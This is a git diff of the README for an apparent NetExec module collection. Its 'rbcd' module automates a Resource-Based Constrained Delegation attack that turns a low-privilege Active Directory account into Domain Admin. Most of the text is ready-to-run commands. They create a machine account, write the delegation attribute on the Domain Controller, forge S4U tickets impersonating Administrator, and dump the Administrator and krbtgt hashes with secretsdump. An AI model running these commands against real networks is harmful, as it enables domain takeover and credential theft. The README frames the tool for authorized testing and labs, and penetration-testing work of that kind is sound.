@@ -1,81 +1,143 @@
-# nxc-modules
+<h1 align="center">nxc-modules</h1>
 
-Custom modules for [NetExec](https://github.com/Pennyw0rth/NetExec) (`nxc`).
+<p align="center">
+  <em>Custom modules for <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> that collapse multi-step AD attacks into a single command.</em>
+</p>
 
-Drop a file into `~/.nxc/modules/` and `nxc` picks it up automatically:
+<p align="center">
+  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="MIT">
+  <img src="https://img.shields.io/badge/nxc-1.5.1-blue.svg" alt="nxc 1.5.1">
+  <img src="https://img.shields.io/badge/protocol-ldap-8a2be2.svg" alt="ldap">
+  <img src="https://img.shields.io/badge/use-authorized%20testing%20only-red.svg" alt="authorized testing only">
+</p>
 
 ```bash
-cp modules/rbcd.py ~/.nxc/modules/
-nxc ldap -L | grep rbcd
+cp modules/<name>.py ~/.nxc/modules/     # nxc auto-loads it
+nxc ldap -L | grep <name>
 ```
 
-Tested on nxc `1.5.1` (Yippie-Ki-Yay).
-
-> For authorized penetration testing, labs, and CTFs only.
+> For authorized penetration testing, lab work, and CTFs only. Don't run these against infrastructure you don't own or aren't paid to break.
 
 ---
 
-## `rbcd` — Resource-Based Constrained Delegation, end to end
+## `rbcd` &nbsp;·&nbsp; GenericAll on a computer &rarr; Domain Admin, in one line
 
-You have a foothold user that can write `msDS-AllowedToActOnBehalfOfOtherIdentity`
-on a computer object (BloodHound edge `GenericAll` / `GenericWrite` / `WriteDacl`
-/ `AddAllowedToAct` on a computer, very often the DC). This module turns that
-edge into a usable Kerberos ticket in one command instead of five.
+You just landed a low-priv account that BloodHound says has `GenericAll` /
+`GenericWrite` / `WriteDacl` / `AddAllowedToAct` over a computer object (nine
+times out of ten, the Domain Controller). The classic
+**Resource-Based Constrained Delegation** path from here is five separate tools,
+four intermediate values copied between them, and one case-sensitive Kerberos
+footgun that fails silently.
 
-### What it does
+This module does the whole thing and hands you a ready-to-use ticket.
 
-| # | Step | Backed by |
-|---|------|-----------|
-| 1 | create a machine account (skipped if you pass your own `FROM`) | `impacket-addcomputer` |
-| 2 | write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target | `impacket-rbcd -action write` |
-| 3 | `S4U2self` + `S4U2proxy`, impersonating `IMPERSONATE` | `impacket-getST` |
-| 4 | save the ccache and print the `export KRB5CCNAME=` line | |
-| 5 | *(optional)* `secretsdump -just-dc` with that ticket | `impacket-secretsdump` |
-| 6 | *(optional)* flush the delegation attribute / delete the computer | `impacket-rbcd`, `impacket-addcomputer` |
+### Demo — OffSec Proving Grounds: *Resourced*
 
-LDAP reconnaissance (resolve `dNSHostName` for the SPN, read
-`ms-DS-MachineAccountQuota`, show the current delegation list) reuses the
-authenticated `nxc` LDAP connection. The privileged operations shell out to the
-impacket CLI tools because `impacket.examples` is not importable on Debian/Kali
-packages.
+<video src="https://github.com/biontdv/nxc-modules/raw/main/assets/demo-resourced.mp4" controls muted width="100%"></video>
 
-### Requirements
+*(video not playing inline? &nbsp;[**▶ watch it here**](https://github.com/biontdv/nxc-modules/raw/main/assets/demo-resourced.mp4))*
 
-- `nxc` with the `ldap` protocol working against the DC
-- impacket CLI tools on `PATH` (`impacket-addcomputer`, `impacket-rbcd`, `impacket-getST`, `impacket-secretsdump`)
-- the DC FQDN must be **resolvable** (add it to `/etc/hosts`) — `getST` and
-  `secretsdump` build the target SPN from it
+Foothold user `L.Livingstone` (leaked in an ntds.dit backup on an open share) has
+`GenericAll` on `RESOURCEDC$`. One `nxc` run later: `Administrator` and `krbtgt`
+hashes.
 
-### Usage
+### Before / after
 
-One-shot to a DA-equivalent DCSync (auto-creates a machine account, needs MAQ > 0):
+<table>
+<tr><th>The usual dance</th><th>With <code>-M rbcd</code></th></tr>
+<tr><td>
 
 ```bash
-cd ~/loot                    # the .ccache is written to the current directory
+impacket-addcomputer 'd/u:p' -computer-name 'PWN$' \
+  -computer-pass 'P4ss' -dc-ip 10.0.0.1
+impacket-rbcd 'd/u:p' -delegate-to 'DC01$' \
+  -delegate-from 'PWN$' -action write -dc-ip 10.0.0.1
+impacket-getST -spn 'cifs/dc01.d.local' \
+  -impersonate Administrator 'd/PWN$:P4ss' -dc-ip 10.0.0.1
+export KRB5CCNAME=Administrator@cifs_dc01...ccache
+impacket-secretsdump -k -no-pass -just-dc dc01.d.local
+```
+
+</td><td>
+
+```bash
+nxc ldap 10.0.0.1 -u u -p p -M rbcd \
+  -o TARGET=DC01 ACTION=full DUMP=true CLEANUP=true
+```
+
+</td></tr>
+</table>
+
+---
+
+## Install
+
+```bash
+git clone https://github.com/biontdv/nxc-modules
+cp nxc-modules/modules/rbcd.py ~/.nxc/modules/
+nxc ldap -M rbcd --options
+```
+
+**Needs:**
+
+- `nxc` with a working `ldap` connection to the DC
+- impacket CLI tools on `PATH` (`impacket-addcomputer`, `impacket-rbcd`, `impacket-getST`, `impacket-secretsdump`)
+- the DC FQDN **resolvable locally** — add it to `/etc/hosts`, or `getST` / `secretsdump` fail (often with no error at all)
+
+---
+
+## What it actually does
+
+```
+ ┌─ LDAP (reuses the authenticated nxc session) ─────────────┐
+ │  resolve dNSHostName · read MachineAccountQuota · list    │
+ │  current msDS-AllowedToActOnBehalfOfOtherIdentity         │
+ └──────────────────────────────────────────────────────────┘
+        │
+        ▼   ①  no FROM given?  create a machine account        impacket-addcomputer
+        ▼   ②  write msDS-AllowedToActOnBehalfOfOtherIdentity   impacket-rbcd  -action write
+        ▼   ③  S4U2self + S4U2proxy as IMPERSONATE             impacket-getST
+        ▼   ④  save ccache  →  print  export KRB5CCNAME=...
+        ▼   ⑤  optional: secretsdump -just-dc                   impacket-secretsdump
+        ▼   ⑥  optional: flush the attribute / drop the computer
+```
+
+LDAP recon runs in-process through the `nxc` connection you already
+authenticated. The privileged steps shell out to the impacket CLIs, because
+`impacket.examples` isn't importable from the Debian/Kali packages.
+
+---
+
+## Recipes
+
+**One-shot to DCSync** (auto-creates a machine account, needs MAQ &gt; 0):
+
+```bash
+cd ~/loot     # the .ccache lands in the current directory
 nxc ldap 10.10.10.10 -u lowpriv -H <nthash> \
   -M rbcd -o TARGET=DC01 ACTION=full IMPERSONATE=Administrator DUMP=true CLEANUP=true
 ```
 
-Just read the current delegation config:
+**Look, don't touch** — show the current delegation config:
 
 ```bash
 nxc ldap 10.10.10.10 -u lowpriv -p 'Passw0rd!' -M rbcd -o TARGET=DC01 ACTION=read
 ```
 
-Bring your own controlled account instead of creating one:
+**Bring your own computer account:**
 
 ```bash
 nxc ldap 10.10.10.10 -u lowpriv -p 'Passw0rd!' \
   -M rbcd -o TARGET=DC01 FROM='EVILPC$' FROM_PASS='Summer2026!' ACTION=full
 ```
 
-Remove what you added afterwards:
+**Undo it:**
 
 ```bash
 nxc ldap 10.10.10.10 -u lowpriv -H <nthash> -M rbcd -o TARGET=DC01 ACTION=flush
 ```
 
-Then use the ticket:
+**Use the ticket it gave you:**
 
 ```bash
 export KRB5CCNAME=./rbcd_Administrator_DC01.ccache
@@ -83,49 +145,60 @@ nxc smb dc01.domain.local --use-kcache
 impacket-secretsdump -k -no-pass -just-dc -dc-ip 10.10.10.10 dc01.domain.local
 ```
 
-### Options
+---
+
+## Options
 
 | Option | Default | Meaning |
 |--------|---------|---------|
-| `TARGET` | host nxc is talking to | computer object to configure delegation **on**; `DC01`, `DC01$` or FQDN |
-| `ACTION` | `full` | `full` (write + S4U + ccache), `read`, `write` (no ticket), `flush` |
-| `FROM` | *(auto-create)* | sAMAccountName of an attacker-controlled account to delegate **from** |
-| `FROM_PASS` / `FROM_HASH` | | credentials for `FROM` when you supply it |
-| `COMPUTER` | random `NXC-xxxxxx$` | name of the machine account to create |
+| `TARGET` | host nxc is talking to | computer object to configure delegation **on** — `DC01`, `DC01$`, or FQDN |
+| `ACTION` | `full` | `full` (write + S4U + ccache) · `read` · `write` (no ticket) · `flush` |
+| `FROM` | *auto-create* | sAMAccountName of an attacker-controlled account to delegate **from** |
+| `FROM_PASS` / `FROM_HASH` | — | credentials for `FROM` when you supply your own |
+| `COMPUTER` | random `NXC-xxxxxx$` | name for the machine account to create |
 | `COMPUTER_PASS` | random | password for the created machine account |
 | `IMPERSONATE` | `Administrator` | user to impersonate through S4U |
 | `SPN` | `cifs/<TARGET dNSHostName>` | service SPN to request |
 | `OUTDIR` | current dir | where to write the `.ccache` |
-| `FORWARDABLE` | `false` | pass `-force-forwardable` to `getST` (needed on some hardened DCs) |
+| `FORWARDABLE` | `false` | add `-force-forwardable` to `getST` (some hardened DCs need it) |
 | `DUMP` | `false` | run `secretsdump -just-dc` with the resulting ticket |
 | `CLEANUP` | `false` | flush the RBCD attribute and try to delete the created computer |
 | `METHOD` | `SAMR` | `impacket-addcomputer` method: `SAMR` or `LDAPS` |
 
-### Caveats
+---
 
-- **DNS**: the target FQDN has to resolve locally, or `getST` / `secretsdump`
-  fail (often silently). Add it to `/etc/hosts`.
-- **Cleanup**: `CLEANUP=true` flushes the delegation attribute reliably, but
-  deleting the auto-created machine account usually fails without Domain Admin
-  (a MAQ creator gets `CreateChild`, not `Delete`, and self-delete is commonly
-  blocked). The module prints the exact `impacket-addcomputer ... -delete`
-  command to run once you have DA.
-- **Case sensitivity**: a ccache minted by `getST -impersonate` holds only the
-  service ticket, and impacket matches the SPN case-sensitively. The module
-  keeps the target name consistent; if you script around it, keep the host part
-  of the SPN and the `secretsdump` target identical.
-- Kerberos is time-sensitive: keep clock skew with the DC under 5 minutes
-  (`ntpdate` / `rdate` / `faketime`).
+## Gotchas
 
-### Verified
+- **DNS.** The target FQDN has to resolve locally or `getST` / `secretsdump`
+  quietly do nothing. `echo '10.10.10.10 dc01.domain.local' | sudo tee -a /etc/hosts`.
+- **Cleanup is partial without DA.** `CLEANUP=true` reliably flushes the
+  delegation attribute, but deleting the machine account you created usually
+  needs Domain Admin (a MAQ creator gets `CreateChild`, not `Delete`, and
+  self-delete is normally blocked). The module prints the exact
+  `impacket-addcomputer ... -delete` line to run once you're DA.
+- **Kerberos SPN casing.** A ccache from `getST -impersonate` contains only the
+  service ticket, and impacket matches the SPN case-sensitively — mismatch the
+  host casing between the SPN and your `secretsdump` target and it bails with no
+  message. The module keeps them consistent; do the same if you script around it.
+- **Clock skew** with the DC must be under 5 minutes (`ntpdate` / `rdate` / `faketime`).
 
-End to end against the OffSec Proving Grounds **Resourced** box
-(`resourced.local`): a foothold user with `GenericAll` on the DC computer object
--> auto-created machine account -> RBCD write -> S4U as `Administrator` ->
-`secretsdump -just-dc` dumped `Administrator` and `krbtgt`.
+---
+
+## Verified
+
+End to end on **OffSec Proving Grounds – Resourced** (`resourced.local`):
+foothold user with `GenericAll` on the DC computer object &rarr; auto-created
+machine account &rarr; RBCD write &rarr; S4U as `Administrator` &rarr;
+`secretsdump -just-dc` dumped `Administrator` and `krbtgt`. See the video above.
 
 ---
 
 ## License
 
-MIT, see [LICENSE](LICENSE).
+MIT — see [LICENSE](LICENSE).
+
+## Credits
+
+Built on [NetExec](https://github.com/Pennyw0rth/NetExec) and
+[Impacket](https://github.com/fortra/impacket). RBCD research by
+Elad Shamir, `@_nwodtuhs`, `@podalirius_`, and the wider AD security community.
